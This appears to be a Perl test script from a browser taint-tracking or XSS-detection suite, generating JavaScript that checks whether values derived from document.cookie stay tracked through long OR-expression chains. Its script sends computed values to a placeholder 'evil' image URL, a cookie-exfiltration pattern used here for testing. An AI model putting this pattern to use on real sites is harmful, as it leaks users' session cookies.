#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_ORX";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq~
    <script type="text/javascript">

		var evil = 3;
		if ($evil) {
			evil = 42;
		}
		var notevil = 42;
		var notevil2 = 42;
		var notevil3 = 42;

		var dut = 7;
		var dut2 = 7;
		var dut3 = 7;
		
		// shouldn't be evil 

		dut = 0 || notevil || ~;
		for ($i = 1; $i < 16730; $i++) {
			print qq~ (notevil + $i) + ~;
		}
print qq~ 3;
		
		var url = "$imgevilurl?normal=" + dut;
		document.images[0].src = url;
		
		// if with evil val 
		
		if ($evil) {
			dut2 = 0 || notevil2 || ~;
		for ($i = 1; $i < 16730; $i++) {
			print qq~ (notevil2 + $i) + ~;
		}
print qq~ 4;
		}
		var url2 = "$imgevilurl?if=" + dut2;
		document.images[1].src = url2;
		
		// normal usage 
		
		notevil3 = evil;
		dut3 = 0 || notevil3 || ~;
		for ($i = 1; $i < 16730; $i++) {
			print qq~ (notevil3 + $i) + ~;
		}
print qq~ 5;
		
		var url3 = "$imgevilurl?isevil=" + dut3;
		document.images[2].src = url3;
		
    </script>
~;

require "xss_basic_footer.pl";